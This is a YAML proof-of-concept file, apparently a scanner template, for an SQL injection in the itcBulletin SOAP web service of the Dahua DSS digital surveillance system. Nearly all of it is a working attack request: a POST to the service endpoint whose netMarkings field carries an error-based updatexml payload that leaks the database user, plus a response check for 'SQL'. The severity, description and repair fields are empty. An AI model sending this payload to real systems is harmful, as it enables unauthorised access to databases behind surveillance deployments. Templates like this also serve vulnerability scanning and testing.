poc/大华DSS/大华DSS数字监控系统 itcBulletin SQL 注入.yaml

id:

info:
  name: 大华DSS数字监控系统 itcBulletin SQL 注入
  severity:
  description:
  details:
  repair:
requests1:
  method: POST
  path: /portal/services/itcBulletin?wsdl
  headers:
  data: |
    <s11:Envelope xmlns:s11='http://schemas.xmlsoap.org/soap/envelope/'>
      <s11:Body>
        <ns1:deleteBulletin xmlns:ns1='http://itcbulletinservice.webservice.dssc.dahua.com'>
          <netMarkings>
            (updatexml(1,concat(0x7e,user(),0x7e),1))) and (1=1
          </netMarkings>
        </ns1:deleteBulletin>
      </s11:Body>
    </s11:Envelope>
response1:
  headers:
  body: SQL
  code:
requests2:
response2: